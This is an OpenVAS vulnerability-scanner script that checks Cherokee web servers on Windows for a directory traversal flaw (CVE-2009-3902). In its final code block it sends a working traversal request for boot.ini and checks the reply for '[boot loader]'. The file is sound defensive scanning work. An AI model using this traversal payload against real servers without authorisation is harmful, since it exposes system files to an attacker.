###############################################################################
# OpenVAS Vulnerability Test
# $Id: cherokee_36874.nasl 14332 2019-03-19 14:22:43Z asteins $
#
# Cherokee Directory Traversal Vulnerability
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################


if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100326");
  script_version("$Revision: 14332 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 15:22:43 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2009-10-30 14:42:19 +0100 (Fri, 30 Oct 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2009-3902");
  script_bugtraq_id(36874);

  script_name("Cherokee Directory Traversal Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/36874");
  script_xref(name:"URL", value:"http://www.alobbs.com/modules.php?op=modload&name=cherokee&file=index");
  script_xref(name:"URL", value:"http://freetexthost.com/ncyss3plli");

  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web Servers");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("Cherokee/banner");
  script_require_ports("Services/www", 80);
  script_tag(name:"summary", value:"Cherokee is prone to a directory-traversal vulnerability because it
fails to sufficiently sanitize user-supplied input data.

Exploiting the issue may allow an attacker to obtain sensitive
information that could aid in further attacks.

Cherokee 0.5.4 and prior versions are vulnerable.");
  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

banner = get_http_banner(port: port);
if(!banner)exit(0);

if("Cherokee" >< banner && "Win" >< banner) {

   url = string("/\\../\\../\\../boot.ini");
   req = http_get(item:url, port:port);
   buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
   if( buf == NULL )exit(0);

   if(egrep(pattern:"\[boot loader\]", string: buf)) {
      security_message(port:port);
      exit(0);
   }
}

exit(0);
